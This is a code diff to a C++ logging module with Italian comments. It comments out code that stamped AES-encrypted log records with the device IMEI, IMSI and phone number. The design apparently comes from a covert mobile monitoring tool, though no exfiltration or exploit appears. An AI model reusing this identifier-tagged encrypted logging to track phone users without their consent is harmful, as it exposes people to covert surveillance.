@@ -1,12 +1,14 @@
 #include "Log.h"
 #include "Device.h"
 #include "Conf.h"
+#include "FunctionFunc.h"
 
 Log::Log() : encryptionObj(g_AesKey, KEY_LEN), hFile(INVALID_HANDLE_VALUE), uStoredToMmc(FLASH), bEmpty(TRUE) {
 	uberlogObj = UberLog::self();
 }
 
 BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMMC) {
+
 #define LOG_CREATION_RETRY_LIMIT 50
 	LogStruct LogDescription;
 	SYSTEMTIME st;
@@ -67,6 +69,7 @@ BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMM
 		return FALSE;
 	}
 
+/*** BYGIO NON DIMENTICARLO
 	Device *deviceObj = Device::self();
 
 	if (deviceObj == NULL) {
@@ -74,7 +77,7 @@ BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMM
 		DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [4]\n", 4, FALSE);
 		return FALSE;
 	}
-
+***/
 	// Aggiorniamo lo stato dell'oggetto
 	uLogType = LogType;
 	uStoredToMmc = uStoreToMMC;
@@ -93,9 +96,11 @@ BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMM
 	LogDescription.uHTimestamp = ft.dwHighDateTime;
 	LogDescription.uLTimestamp = ft.dwLowDateTime;
 	LogDescription.uAdditionalData = uAdditional;
+/***
 	LogDescription.uDeviceIdLen = deviceObj->GetImei().size() * sizeof(WCHAR); // XXX Non sono NULL-terminati
 	LogDescription.uUserIdLen = deviceObj->GetImsi().size() * sizeof(WCHAR);
 	LogDescription.uSourceIdLen = deviceObj->GetPhoneNumber().size() * sizeof(WCHAR);
+***/
 
 	// Creiamo un buffer grande abbastanza da contenere l'header e gli additional data
 	UINT uHeaderLen = sizeof(LogDescription) + LogDescription.uDeviceIdLen + LogDescription.uUserIdLen
@@ -117,7 +122,7 @@ BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMM
 
 	CopyMemory(pTmp, &LogDescription, sizeof(LogDescription));
 	pTmp += sizeof(LogDescription);
-
+/***
 	if (LogDescription.uDeviceIdLen) {
 		CopyMemory(pTmp, deviceObj->GetImei().c_str(), deviceObj->GetImei().size() * sizeof(WCHAR));
 		pTmp += deviceObj->GetImei().size() * sizeof(WCHAR);
@@ -132,7 +137,7 @@ BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMM
 		CopyMemory(pTmp, deviceObj->GetPhoneNumber().c_str(), deviceObj->GetPhoneNumber().size() * sizeof(WCHAR));
 		pTmp += deviceObj->GetPhoneNumber().size() * sizeof(WCHAR);
 	}
-
+***/
 	if (LogDescription.uAdditionalData) {
 		CopyMemory(pTmp, pByte, uAdditional);
 	}
@@ -173,6 +178,7 @@ BOOL Log::CreateLog(UINT LogType, BYTE* pByte, UINT uAdditional, UINT uStoreToMM
 		delete[] pEncryptedHeader;
 
 	DBG_TRACE(L"Debug - Log.cpp - CreateLog() FAILED [9] ", 4, TRUE);
+
 	return FALSE;
 }
 
